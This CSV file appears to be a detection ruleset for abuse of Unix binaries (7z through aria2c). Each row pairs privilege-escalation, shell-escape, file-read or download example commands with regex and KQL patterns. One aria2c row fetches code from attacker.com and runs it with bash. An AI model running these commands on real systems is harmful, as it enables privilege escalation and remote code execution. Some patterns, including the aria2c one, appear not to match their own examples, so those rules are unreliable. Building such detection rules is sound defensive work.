Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
7z,file-read,7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,"""-ttar",(?i)\b(?:\S*/)?7z.*\-ttar,"@""(?i)\b(?:\S*/)?7z.*\-ttar""",
7z,sudo,sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,sudo -ttar,(?i)\b(?:\S*/)?7z.*sudo.*\-ttar,"@""(?i)\b(?:\S*/)?7z.*sudo.*\-ttar""",
aa-exec,shell,aa-exec /bin/sh,/bin/sh,(?i)\b(?:\S*/)?aa\-exec.*/bin/sh,"@""(?i)\b(?:\S*/)?aa\-exec.*/bin/sh""",
aa-exec,suid,./aa-exec /bin/sh -p,/bin/sh /aa-exec,(?i)\b(?:\S*/)?aa\-exec.*/bin/sh.*/aa\-exec,"@""(?i)\b(?:\S*/)?aa\-exec.*/bin/sh.*/aa\-exec""",
aa-exec,sudo,sudo aa-exec /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?aa\-exec.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?aa\-exec.*sudo.*/bin/sh""",
ab,file-upload,ab -p $LFILE $URL,,(?i)\b(?:\S*/)?ab\b,"@""(?i)\b(?:\S*/)?ab\b""",
ab,file-download,ab -v2 $URL,,(?i)\b(?:\S*/)?ab\b,"@""(?i)\b(?:\S*/)?ab\b""",
ab,suid,./ab -p $LFILE $URL,,(?i)\b(?:\S*/)?ab\b,"@""(?i)\b(?:\S*/)?ab\b""",
ab,sudo,sudo ab -p $LFILE $URL,sudo,(?i)\b(?:\S*/)?ab.*sudo,"@""(?i)\b(?:\S*/)?ab.*sudo""",
agetty,suid,./agetty -o -p -l /bin/sh -a root tty,/bin/sh root tty /agetty,(?i)\b(?:\S*/)?agetty.*/bin/sh.*root.*tty.*/agetty,"@""(?i)\b(?:\S*/)?agetty.*/bin/sh.*root.*tty.*/agetty""",
alpine,file-read,"alpine -F ""$LFILE""",,(?i)\b(?:\S*/)?alpine\b,"@""(?i)\b(?:\S*/)?alpine\b""",
alpine,suid,"./alpine -F ""$LFILE""",/alpine,(?i)\b(?:\S*/)?alpine.*/alpine,"@""(?i)\b(?:\S*/)?alpine.*/alpine""",
alpine,sudo,"sudo alpine -F ""$LFILE""",sudo,(?i)\b(?:\S*/)?alpine.*sudo,"@""(?i)\b(?:\S*/)?alpine.*sudo""",
ansible-playbook,shell,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF",echo hosts localhost tasks shell /bin/sh /dev/tty,(?i)\b(?:\S*/)?ansible\-playbook.*echo.*hosts.*localhost.*tasks.*shell.*/bin/sh.*/dev/tty,"@""(?i)\b(?:\S*/)?ansible\-playbook.*echo.*hosts.*localhost.*tasks.*shell.*/bin/sh.*/dev/tty""",
ansible-playbook,sudo,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF",echo hosts localhost tasks shell /bin/sh /dev/tty sudo,(?i)\b(?:\S*/)?ansible\-playbook.*echo.*hosts.*localhost.*tasks.*shell.*/bin/sh.*/dev/tty.*sudo,"@""(?i)\b(?:\S*/)?ansible\-playbook.*echo.*hosts.*localhost.*tasks.*shell.*/bin/sh.*/dev/tty.*sudo""",
ansible-test,shell,ansible-test shell,shell,(?i)\b(?:\S*/)?ansible\-test.*shell,"@""(?i)\b(?:\S*/)?ansible\-test.*shell""",
ansible-test,sudo,sudo ansible-test shell,sudo shell,(?i)\b(?:\S*/)?ansible\-test.*sudo.*shell,"@""(?i)\b(?:\S*/)?ansible\-test.*sudo.*shell""",
aoss,shell,aoss /bin/sh,/bin/sh,(?i)\b(?:\S*/)?aoss.*/bin/sh,"@""(?i)\b(?:\S*/)?aoss.*/bin/sh""",
aoss,sudo,sudo aoss /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?aoss.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?aoss.*sudo.*/bin/sh""",
apache2ctl,file-read,"apache2ctl -c ""Include $LFILE"" -k stop",Include stop,(?i)\b(?:\S*/)?apache2ctl.*Include.*stop,"@""(?i)\b(?:\S*/)?apache2ctl.*Include.*stop""",
apache2ctl,sudo,"sudo apache2ctl -c ""Include $LFILE"" -k stop",sudo Include stop,(?i)\b(?:\S*/)?apache2ctl.*sudo.*Include.*stop,"@""(?i)\b(?:\S*/)?apache2ctl.*sudo.*Include.*stop""",
apt-get,shell,"apt-get changelog apt
!/bin/sh",changelog apt /bin/sh,(?i)\b(?:\S*/)?apt\-get.*changelog.*apt.*/bin/sh,"@""(?i)\b(?:\S*/)?apt\-get.*changelog.*apt.*/bin/sh""",
apt-get,sudo,"sudo apt-get changelog apt
!/bin/sh",sudo changelog apt /bin/sh,(?i)\b(?:\S*/)?apt\-get.*sudo.*changelog.*apt.*/bin/sh,"@""(?i)\b(?:\S*/)?apt\-get.*sudo.*changelog.*apt.*/bin/sh""",
apt-get,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt-get install -c $TF sl",echo Dpkg Pre-Invoke /bin/sh false sudo install,(?i)\b(?:\S*/)?apt\-get.*echo.*Dpkg.*Pre\-Invoke.*/bin/sh.*false.*sudo.*install,"@""(?i)\b(?:\S*/)?apt\-get.*echo.*Dpkg.*Pre\-Invoke.*/bin/sh.*false.*sudo.*install""",
apt-get,sudo,sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,sudo update APT Pre-Invoke =/bin/sh /bin/sh,(?i)\b(?:\S*/)?apt\-get.*sudo.*update.*APT.*Pre\-Invoke.*/bin/sh.*/bin/sh,"@""(?i)\b(?:\S*/)?apt\-get.*sudo.*update.*APT.*Pre\-Invoke.*/bin/sh.*/bin/sh""",
apt,shell,"apt changelog apt
!/bin/sh",changelog /bin/sh,(?i)\b(?:\S*/)?apt.*changelog.*/bin/sh,"@""(?i)\b(?:\S*/)?apt.*changelog.*/bin/sh""",
apt,sudo,"sudo apt changelog apt
!/bin/sh",sudo changelog /bin/sh,(?i)\b(?:\S*/)?apt.*sudo.*changelog.*/bin/sh,"@""(?i)\b(?:\S*/)?apt.*sudo.*changelog.*/bin/sh""",
apt,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt install -c $TF sl",echo Dpkg Pre-Invoke /bin/sh false sudo install,(?i)\b(?:\S*/)?apt.*echo.*Dpkg.*Pre\-Invoke.*/bin/sh.*false.*sudo.*install,"@""(?i)\b(?:\S*/)?apt.*echo.*Dpkg.*Pre\-Invoke.*/bin/sh.*false.*sudo.*install""",
apt,sudo,sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh,sudo update Pre-Invoke =/bin/sh /bin/sh,(?i)\b(?:\S*/)?apt.*sudo.*update.*Pre\-Invoke.*/bin/sh.*/bin/sh,"@""(?i)\b(?:\S*/)?apt.*sudo.*update.*Pre\-Invoke.*/bin/sh.*/bin/sh""",
ar,file-read,"ar r ""$TF"" ""$LFILE""
cat ""$TF""",cat,(?i)\b(?:\S*/)?ar.*cat,"@""(?i)\b(?:\S*/)?ar.*cat""",
ar,suid,"./ar r ""$TF"" ""$LFILE""
cat ""$TF""",cat,(?i)\b(?:\S*/)?ar.*cat,"@""(?i)\b(?:\S*/)?ar.*cat""",
ar,sudo,"sudo ar r ""$TF"" ""$LFILE""
cat ""$TF""",sudo cat,(?i)\b(?:\S*/)?ar.*sudo.*cat,"@""(?i)\b(?:\S*/)?ar.*sudo.*cat""",
aria2c,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x",echo chmod --on-download-error= http,(?i)\b(?:\S*/)?aria2c.*echo.*chmod.*\-\-on\-download\-error.*http,"@""(?i)\b(?:\S*/)?aria2c.*echo.*chmod.*\-\-on\-download\-error.*http""",
aria2c,command,aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa,--allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http //attacker.com/aaaaaaaaaaaaaaaa,(?i)\b(?:\S*/)?aria2c.*\-\-allow\-overwrite.*\-\-gidaaaaaaaaaaaaaaaa.*\-\-on\-download\-completebash.*http.*//attacker\.com/aaaaaaaaaaaaaaaa,"@""(?i)\b(?:\S*/)?aria2c.*\-\-allow\-overwrite.*\-\-gidaaaaaaaaaaaaaaaa.*\-\-on\-download\-completebash.*http.*//attacker\.com/aaaaaaaaaaaaaaaa""",
aria2c,file-download,"aria2c -o ""$LFILE"" ""$URL""",,(?i)\b(?:\S*/)?aria2c\b,"@""(?i)\b(?:\S*/)?aria2c\b""",
aria2c,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x",echo chmod sudo --on-download-error= http,(?i)\b(?:\S*/)?aria2c.*echo.*chmod.*sudo.*\-\-on\-download\-error.*http,"@""(?i)\b(?:\S*/)?aria2c.*echo.*chmod.*sudo.*\-\-on\-download\-error.*http""",
